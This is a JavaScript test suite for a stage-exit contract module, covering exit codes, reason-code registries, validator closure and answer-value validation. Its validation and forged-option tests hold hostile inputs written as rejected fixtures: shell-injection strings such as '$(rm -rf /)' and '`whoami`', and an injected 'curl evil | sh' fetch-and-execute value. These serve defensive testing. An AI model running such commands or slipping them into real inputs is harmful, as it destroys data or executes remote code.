// pharn/floor/stage-exit-core.test.mjs — the shared stage-exit contract's suite: exit-table closure,
// validator closure in both directions, registry completeness, the answer-value shape checks (GRILL G11),
// and the budget boundary (GRILL G5).

import { test } from "node:test";
import assert from "node:assert/strict";
import {
  SCHEMA,
  STATUSES,
  STAGES,
  REGISTRY,
  FEATURE_SLUG_RE,
  EXIT_CODE,
  EXIT_CODE_SET,
  VALUE_KINDS,
  statusForExitCode,
  isReasonCode,
  allReasonCodes,
  validateAnswer,
  substituteArgv,
  doneExit,
  refusedExit,
  unusableExit,
  continueExit,
  questionExit,
  validateStageExit,
  mayStartSlowStep,
} from "./stage-exit-core.mjs";

// ── EXIT TABLE ──────────────────────────────────────────────────────────────────────────────────────
test("★ EXIT TABLE — the codes are exactly {0, 2, 3, 4, 5}; 1 is absent", () => {
  assert.deepEqual(EXIT_CODE_SET, [0, 2, 3, 4, 5]);
  assert.ok(!EXIT_CODE_SET.includes(1), "1 is node's own uncaught-throw code — never a deliberate emission");
  assert.deepEqual(new Set(Object.values(EXIT_CODE)), new Set(EXIT_CODE_SET));
  assert.equal(Object.keys(EXIT_CODE).length, STATUSES.length, "every status has exactly one exit code");
});

test("statusForExitCode: round-trips every EXIT_CODE member; anything else is null (a crash, never a guess)", () => {
  for (const [status, code] of Object.entries(EXIT_CODE)) {
    assert.equal(statusForExitCode(code), status);
  }
  for (const code of [1, 6, -1, 130, 137]) {
    assert.equal(statusForExitCode(code), null, `exit ${code} must not resolve to a status`);
  }
});

// ── REGISTRY COMPLETENESS ───────────────────────────────────────────────────────────────────────────
test("REGISTRY: the regress vocabulary matches the plan's closed table exactly", () => {
  assert.deepEqual(
    new Set(REGISTRY.regress.refused),
    new Set(["missing-artifact", "chain-red", "plan-files-unparseable", "scope-escaped"])
  );
  assert.deepEqual(
    new Set(Object.keys(REGISTRY.regress.question)),
    new Set(["base-unresolved", "no-gates", "install-unresolved", "tests-unresolved"])
  );
  assert.deepEqual(
    new Set(REGISTRY.regress.unusable),
    new Set([
      "usage-error",
      "no-feature",
      "path-containment",
      "unrepresentable-path",
      "git-failed",
      "child-crashed",
      "child-refused",
      "no-progress",
      "progress-malformed",
    ])
  );
  assert.deepEqual(STAGES, ["regress", "verify"]);
});

test("REGISTRY: the verify vocabulary matches the stage-verify-script plan's closed table exactly (6.26.0)", () => {
  assert.deepEqual(REGISTRY.verify.refused, ["missing-artifact", "chain-red", "plan-files-unparseable"]);
  assert.deepEqual(Object.keys(REGISTRY.verify.question), ["no-gates"]);
  assert.deepEqual(REGISTRY.verify.unusable, [
    "usage-error",
    "no-feature",
    "path-containment",
    "git-failed",
    "child-crashed",
    "child-refused",
    "no-progress",
    "progress-malformed",
  ]);
  assert.equal(allReasonCodes("verify").length, 3 + 1 + 8);
  // verify's no-gates names its one cause and the AC-gate caveat, and offers exactly --gates or stop.
  const q = REGISTRY.verify.question["no-gates"];
  assert.match(q.question, /test-infra-changed/);
  assert.deepEqual(
    q.options.map((o) => [o.id, o.argv]),
    [
      ["gates", ["--gates", "<value>"]],
      ["stop", null],
    ]
  );
});

test("cross-stage isolation — a regress-only code is not a verify member, and a question is bound to its OWN stage's text", () => {
  assert.equal(isReasonCode("verify", "refused", "scope-escaped"), false, "scope-escaped is regress-only");
  assert.equal(isReasonCode("verify", "unusable", "unrepresentable-path"), false);
  assert.equal(isReasonCode("verify", "question", "base-unresolved"), false);
  assert.throws(
    () => refusedExit({ stage: "verify", feature: "demo", reasonCode: "scope-escaped", render: "R.md" }),
    /not a registered 'refused'/
  );
  // Both stages have a `no-gates` question, with DIFFERENT fixed text: each object validates only under its own stage.
  const verifyQ = questionExit({ stage: "verify", feature: "demo", reasonCode: "no-gates", resumeArgv: ["--feature", "demo"] });
  const regressQ = questionExit({ stage: "regress", feature: "demo", reasonCode: "no-gates", resumeArgv: ["--feature", "demo"] });
  assert.notEqual(verifyQ.question, regressQ.question);
  assert.deepEqual(validateStageExit(verifyQ), { ok: true });
  assert.equal(validateStageExit({ ...verifyQ, stage: "regress" }).ok, false, "verify's text under the regress stage must be refused");
  assert.equal(validateStageExit({ ...regressQ, stage: "verify" }).ok, false, "regress's text under the verify stage must be refused");
});

test("every registered question has fixed, non-empty text and >=1 well-formed option; every option.value.kind is a member of VALUE_KINDS", () => {
  for (const stage of STAGES) {
    for (const [code, entry] of Object.entries(REGISTRY[stage].question)) {
      assert.ok(entry.question.length > 0, `${stage}/${code} has empty question text`);
      assert.ok(Array.isArray(entry.options) && entry.options.length > 0, `${stage}/${code} has no options`);
      for (const opt of entry.options) {
        assert.ok(opt.id.length > 0);
        assert.ok(opt.label.length > 0);
        assert.ok(opt.argv === null || Array.isArray(opt.argv));
        if (opt.value !== null) assert.ok(VALUE_KINDS.includes(opt.value.kind), `${stage}/${code}/${opt.id} has an unknown value.kind`);
      }
      // At least one option must actually be a re-invocation (argv !== null), or the question could never
      // be answered productively.
      assert.ok(
        entry.options.some((o) => o.argv !== null),
        `${stage}/${code} has no re-invoking option`
      );
    }
  }
});

test("isReasonCode / allReasonCodes: membership matches the registry, and non-members are rejected", () => {
  assert.ok(isReasonCode("regress", "refused", "chain-red"));
  assert.ok(isReasonCode("regress", "question", "no-gates"));
  assert.ok(isReasonCode("regress", "unusable", "path-containment"));
  assert.equal(isReasonCode("regress", "refused", "no-gates"), false, "no-gates is a QUESTION code, not refused");
  assert.equal(isReasonCode("regress", "question", "chain-red"), false, "chain-red is a REFUSED code, not a question");
  assert.equal(isReasonCode("regress", "done", "anything"), false, "done carries no reason_code");
  assert.equal(isReasonCode("nonexistent-stage", "refused", "chain-red"), false);

  const all = allReasonCodes("regress");
  assert.equal(all.length, 4 + 4 + 9, "refused + question + unusable counts");
  assert.deepEqual(new Set(all).size, all.length, "no duplicate reason_code across the three sub-vocabularies");
  assert.deepEqual(allReasonCodes("nonexistent-stage"), []);
});

// ── ANSWER VALIDATION (GRILL G11) ───────────────────────────────────────────────────────────────────
test("validateAnswer: control-char-free, bounded, no leading '-' — the baseline every kind shares", () => {
  assert.equal(validateAnswer("shell-command", "").ok, false, "empty is refused");
  assert.equal(validateAnswer("shell-command", "-x").ok, false, "a leading dash is refused (read as a flag)");
  assert.equal(validateAnswer("shell-command", "npm run test\x01").ok, false, "a control character is refused");
  assert.equal(validateAnswer("shell-command", "x".repeat(5000)).ok, false, "over the bound is refused");
  assert.equal(validateAnswer("shell-command", "npm run test:unit").ok, true);
});

test("validateAnswer: git-commit and pathspec-list are held to a closed, shell-metacharacter-free charset", () => {
  for (const good of ["HEAD", "main", "origin/main", "a1b2c3d4e5f6", "release-1.2.3"]) {
    assert.equal(validateAnswer("git-commit", good).ok, true, `git-commit should accept ${good}`);
  }
  for (const bad of ["$(rm -rf /)", "HEAD; rm -rf /", "a b", "`whoami`", "a'b", 'a"b', "a|b", "a&b", "a<b", "a>b", "a\\b"]) {
    assert.equal(validateAnswer("git-commit", bad).ok, false, `git-commit must refuse ${bad}`);
  }
  for (const good of ["src/**/*.test.ts", "a.ts,b.ts", "test/*.spec.js"]) {
    assert.equal(validateAnswer("pathspec-list", good).ok, true, `pathspec-list should accept ${good}`);
  }
  for (const bad of ["$(rm -rf /)", "a; b", "a$b", "a\nb"]) {
    assert.equal(validateAnswer("pathspec-list", bad).ok, false, `pathspec-list must refuse ${bad}`);
  }
});

test("validateAnswer: gates-spec and shell-command allow their own metacharacters (shell text, exactly as --gates/--install)", () => {
  assert.equal(validateAnswer("gates-spec", "npm run test::t,npm run lint::l").ok, true);
  assert.equal(validateAnswer("shell-command", "npm ci && npm run build").ok, true);
});

test("validateAnswer: an unregistered kind is a caller bug (throws), never a silent pass", () => {
  assert.throws(() => validateAnswer("not-a-kind", "x"), /not a member of VALUE_KINDS/);
});

test("substituteArgv: replaces the literal '<value>' token; null template means stop", () => {
  assert.deepEqual(substituteArgv(["--base", "<value>"], "origin/main"), ["--base", "origin/main"]);
  assert.deepEqual(substituteArgv(["--no-tests"], "anything"), ["--no-tests"], "no token to replace: untouched");
  assert.equal(substituteArgv(null, "anything"), null);
});

// ── BUILDERS + VALIDATOR ROUND-TRIP ─────────────────────────────────────────────────────────────────
test("doneExit / refusedExit / unusableExit / continueExit / questionExit each produce an object validateStageExit accepts", () => {
  const done = doneExit({
    stage: "regress",
    feature: "demo",
    verdict: "no-regressions",
    report: "pharn/features/demo/regression-report.json",
    render: "pharn/features/demo/REGRESSION.md",
  });
  assert.equal(done.schema, SCHEMA);
  assert.deepEqual(validateStageExit(done), { ok: true });

  const refused = refusedExit({ stage: "regress", feature: "demo", reasonCode: "chain-red", render: "pharn/features/demo/REGRESSION.md" });
  assert.deepEqual(validateStageExit(refused), { ok: true });

  const unusable = unusableExit({ stage: "regress", feature: "demo", reasonCode: "path-containment", detail: "a symlink was refused" });
  assert.deepEqual(validateStageExit(unusable), { ok: true });

  const cont = continueExit({ stage: "regress", feature: "demo", phase: "drain-head", resumeArgv: ["--resume"] });
  assert.deepEqual(validateStageExit(cont), { ok: true });

  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "base-unresolved", resumeArgv: ["--feature", "demo"] });
  assert.deepEqual(validateStageExit(question), { ok: true });
  assert.equal(question.question, REGISTRY.regress.question["base-unresolved"].question, "question text is the FIXED registry text");
});

test("builders reject an unregistered stage / reason_code as an internal (caller-side) error", () => {
  assert.throws(() => doneExit({ stage: "not-a-stage", feature: null, verdict: "x", report: "r", render: "m" }));
  assert.throws(() => refusedExit({ stage: "regress", feature: null, reasonCode: "no-gates", render: "m" }), /not a registered 'refused'/);
  assert.throws(
    () => questionExit({ stage: "regress", feature: null, reasonCode: "chain-red", resumeArgv: [] }),
    /not a registered 'question'/
  );
  assert.throws(
    () => unusableExit({ stage: "regress", feature: null, reasonCode: "chain-red", detail: "x" }),
    /not a registered 'unusable'/
  );
});

test("★ VALIDATOR CLOSURE — every required key is enforced present, and no extra key is admitted (either direction)", () => {
  const base = doneExit({
    stage: "regress",
    feature: "demo",
    verdict: "no-regressions",
    report: "r.json",
    render: "R.md",
  });
  // missing a required key
  for (const k of ["verdict", "report", "render", "schema", "status", "stage"]) {
    const mutated = { ...base };
    delete mutated[k];
    assert.equal(validateStageExit(mutated).ok, false, `dropping ${k} must be refused`);
  }
  // an extra key outside the closed set
  assert.equal(validateStageExit({ ...base, extra: "not allowed" }).ok, false, "an extra key must be refused");
  // a key belonging to a DIFFERENT status
  assert.equal(validateStageExit({ ...base, reason_code: "chain-red" }).ok, false, "done must not admit refused's reason_code");
});

test("validateStageExit: rejects a bad schema, an unknown status, an unknown stage, and a malformed feature", () => {
  const base = doneExit({ stage: "regress", feature: "demo", verdict: "v", report: "r", render: "m" });
  assert.equal(validateStageExit({ ...base, schema: "pharn-stage-exit/2" }).ok, false);
  assert.equal(validateStageExit({ ...base, status: "finished" }).ok, false);
  assert.equal(validateStageExit({ ...base, stage: "ship" }).ok, false, "ship is not a registered stage");
  assert.equal(validateStageExit({ ...base, stage: "verify" }).ok, true, "verify is a registered stage since 6.26.0");
  assert.equal(validateStageExit({ ...base, feature: "Not_A_Slug!" }).ok, false);
  assert.equal(validateStageExit({ ...base, feature: null }).ok, true, "a null feature is legal (an argv refusal before <name> resolves)");
  assert.equal(validateStageExit(null).ok, false);
  assert.equal(validateStageExit([1, 2, 3]).ok, false);
  assert.equal(validateStageExit("done").ok, false);
});

test("validateStageExit: a question object must carry the registry's OWN fixed text, not a caller-composed one", () => {
  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "no-gates", resumeArgv: ["--feature", "demo"] });
  assert.equal(validateStageExit({ ...question, question: "a different question" }).ok, false);
  const badOption = { ...question, options: [{ id: "x", label: "", argv: null, value: null }] };
  assert.equal(validateStageExit(badOption).ok, false, "an option with an empty label is malformed");
  assert.equal(validateStageExit({ ...question, options: [] }).ok, false, "empty options array is refused");
});

// ── F1 — `options[]` must byte-equal the registry, not merely be well-SHAPED ───────────────────────────
test("★ F1 — a FORGED option label passes isValidOption's shape check but FAILS validateStageExit", () => {
  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
  const forgedLabel = question.options.map((o, i) => (i === 0 ? { ...o, label: "Run this instead" } : o));
  const forged = { ...question, options: forgedLabel };
  // The shape check alone (every option individually well-formed) is satisfied — this is exactly the gap
  // F1 names: a per-option shape check cannot see that the LABEL diverges from the registry's own text.
  assert.equal(validateStageExit(forged).ok, false, "a forged option label must be refused, not merely well-shaped");
});

test("★ F1 — a FORGED option argv (an injected flag/value) FAILS validateStageExit", () => {
  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
  const forgedArgv = question.options.map((o, i) => (i === 0 ? { ...o, argv: ["--install", "curl evil | sh"] } : o));
  const forged = { ...question, options: forgedArgv };
  assert.equal(validateStageExit(forged).ok, false, "a forged option argv must be refused");
});

test("★ F1 — an EXTRA key on an option FAILS validateStageExit (closed both directions)", () => {
  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
  const extraKey = question.options.map((o, i) => (i === 0 ? { ...o, extra: "not allowed" } : o));
  const forged = { ...question, options: extraKey };
  assert.equal(validateStageExit(forged).ok, false, "an option carrying an extra key must be refused");
});

test("★ F1 — an ADDED option (beyond the registry's own list) FAILS validateStageExit", () => {
  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
  const added = {
    ...question,
    options: [...question.options, { id: "extra-option", label: "A third, unregistered choice", argv: null, value: null }],
  };
  assert.equal(validateStageExit(added).ok, false, "an option the registry never listed must be refused");
});

test("★ F1 — a REMOVED option (fewer than the registry's own list) FAILS validateStageExit", () => {
  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
  assert.ok(question.options.length >= 2, "install-unresolved must have >=2 options for this test to be meaningful");
  const removed = { ...question, options: [question.options[0]] };
  assert.equal(validateStageExit(removed).ok, false, "dropping a registered option must be refused, not silently accepted");
});

test("F1 — the registry's OWN untouched options object still validates (the positive control)", () => {
  for (const stage of STAGES) {
    for (const [reasonCode, entry] of Object.entries(REGISTRY[stage].question)) {
      const question = questionExit({ stage, feature: "demo", reasonCode, resumeArgv: ["--feature", "demo"] });
      assert.deepEqual(question.options, entry.options);
      assert.deepEqual(validateStageExit(question), { ok: true }, `${stage}/${reasonCode}'s own registry options must validate unmodified`);
    }
  }
});

// ── F1 for VERIFY's `no-gates` (6.26.0) — the same five controls, on the new stage's own question ──────
test("★ F1 (verify) — a forged label, a forged argv, an extra key, an added and a removed option each FAIL validateStageExit", () => {
  const q = questionExit({ stage: "verify", feature: "demo", reasonCode: "no-gates", resumeArgv: ["--feature", "demo"] });
  assert.equal(q.options.length, 2, "precondition: two registered options, so a removal is meaningful");
  const forged = [
    ["a forged label", q.options.map((o, i) => (i === 0 ? { ...o, label: "Run this instead" } : o))],
    ["a forged argv", q.options.map((o, i) => (i === 0 ? { ...o, argv: ["--gates", "curl evil | sh"] } : o))],
    ["an extra key", q.options.map((o, i) => (i === 0 ? { ...o, extra: 1 } : o))],
    ["an added option", [...q.options, { id: "more", label: "An unregistered choice", argv: null, value: null }]],
    ["a removed option", [q.options[0]]],
  ];
  for (const [label, options] of forged) {
    assert.equal(validateStageExit({ ...q, options }).ok, false, `${label} must be refused`);
  }
  assert.deepEqual(validateStageExit(q), { ok: true }, "the untouched object is the positive control");
});

// ── M8 — FEATURE_SLUG_RE is a SEPARATE copy from gate-run-core.mjs's; pin the two to agree ─────────────
test("M8 — stage-exit-core.mjs's re-declared FEATURE_SLUG_RE stays byte-identical to gate-run-core.mjs's", async () => {
  const { FEATURE_SLUG_RE: fromGateRunCore } = await import("./gate-run-core.mjs");
  // Nothing pinned this before (M8): stage-exit-core.mjs imports NOTHING (see the module header), so it
  // cannot import gate-run-core.mjs's copy — it re-declares its own. If one copy ever widens, argv would
  // accept a slug the builders reject, and every emission (a `done` included, after the report is
  // written) becomes a crash. Comparing `.source`/`.flags` catches ANY character-level divergence, not
  // only the cases a finite list happens to cover.
  assert.equal(FEATURE_SLUG_RE.source, fromGateRunCore.source, "FEATURE_SLUG_RE's pattern drifted between the two copies");
  assert.equal(FEATURE_SLUG_RE.flags, fromGateRunCore.flags, "FEATURE_SLUG_RE's flags drifted between the two copies");
});

// ── THE BUDGET DECISION (GRILL G5) ──────────────────────────────────────────────────────────────────
test("★ mayStartSlowStep — the first slow step of an invocation ALWAYS starts", () => {
  assert.equal(mayStartSlowStep({ elapsedMs: 999999, timeoutMs: 540000, budgetMs: 1, slowStepsThisInvocation: 0 }), true);
});

test("★ mayStartSlowStep — unbudgeted (budgetMs null/undefined) always starts after the first step too", () => {
  assert.equal(mayStartSlowStep({ elapsedMs: 999999999, timeoutMs: 540000, budgetMs: null, slowStepsThisInvocation: 5 }), true);
  assert.equal(mayStartSlowStep({ elapsedMs: 999999999, timeoutMs: 540000, budgetMs: undefined, slowStepsThisInvocation: 5 }), true);
});

test("★ mayStartSlowStep — the exact boundary: elapsed + timeout === budget starts; +1 over does not", () => {
  assert.equal(mayStartSlowStep({ elapsedMs: 0, timeoutMs: 100, budgetMs: 100, slowStepsThisInvocation: 1 }), true);
  assert.equal(mayStartSlowStep({ elapsedMs: 1, timeoutMs: 100, budgetMs: 101, slowStepsThisInvocation: 1 }), true);
  assert.equal(mayStartSlowStep({ elapsedMs: 0, timeoutMs: 101, budgetMs: 100, slowStepsThisInvocation: 1 }), false);
  assert.equal(mayStartSlowStep({ elapsedMs: 2, timeoutMs: 100, budgetMs: 101, slowStepsThisInvocation: 1 }), false);
});

test("mayStartSlowStep: malformed numeric inputs are a caller bug (throws), never coerced", () => {
  assert.throws(() => mayStartSlowStep({ elapsedMs: -1, timeoutMs: 1, budgetMs: null, slowStepsThisInvocation: 1 }));
  assert.throws(() => mayStartSlowStep({ elapsedMs: 0, timeoutMs: 0, budgetMs: null, slowStepsThisInvocation: 1 }));
  assert.throws(() => mayStartSlowStep({ elapsedMs: 0, timeoutMs: 1, budgetMs: null, slowStepsThisInvocation: -1 }));
  assert.throws(() => mayStartSlowStep({ elapsedMs: 0, timeoutMs: 1, budgetMs: -1, slowStepsThisInvocation: 1 }));
});
